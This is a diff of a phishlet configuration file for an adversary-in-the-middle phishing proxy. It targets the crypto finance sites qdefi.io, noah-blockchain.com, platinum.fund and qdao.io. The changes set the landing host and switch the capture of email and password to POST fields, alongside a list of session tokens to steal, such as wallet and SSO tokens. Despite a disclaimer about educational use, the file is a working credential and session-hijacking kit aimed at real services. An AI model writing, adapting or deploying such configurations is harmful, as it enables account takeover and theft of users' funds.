@@ -1,14 +1,14 @@
 # AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
 # PLEASE DO NOT MISUSE THIS PHISHLET.
 
-author: '@'
+author: '@an0nud4y'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: '', orig_sub: '', domain: 'qdefi.io', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'qdefi.io', session: true, is_landing: true}
   - {phish_sub: 'api', orig_sub: 'api', domain: 'qdefi.io', session: true, is_landing: false}  
   - {phish_sub: '', orig_sub: '', domain: 'noah-blockchain.com', session: true, is_landing: false}
   - {phish_sub: 'wallet', orig_sub: 'wallet', domain: 'noah-blockchain.com', session: true, is_landing: false}  
-  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'platinum.fund', session: true, is_landing: true}
+  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'platinum.fund', session: true, is_landing: false}
   - {phish_sub: '', orig_sub: '', domain: 'platinum.fund', session: true, is_landing: false}  
   - {phish_sub: 'rater', orig_sub: 'rater', domain: 'qdao.io', session: true, is_landing: false}
 
@@ -70,21 +70,16 @@ auth_tokens:
   - domain: 'wallet.noah-blockchain.com'
     keys: ['ssoAuthToken', 'wallet_token', 'XSRF-TOKEN', '.*,regexp']
     
-
 credentials:
   username:
-    key: ''
-    search: '"email":"([^"]*)'
-    type: 'json'
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
   password:
-    key: ''
-    search: '"password":"([^"]*)'
-    type: 'json'
-    
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
     
 login:
-  domain: 'wallet.noah-blockchain.com'
-  path: '/defi'
-  
-# https://wallet.varuv.xyz/defi  
-# https://auth.platinum.fund/login
+  domain: 'qdefi.io'
+  path: '/'
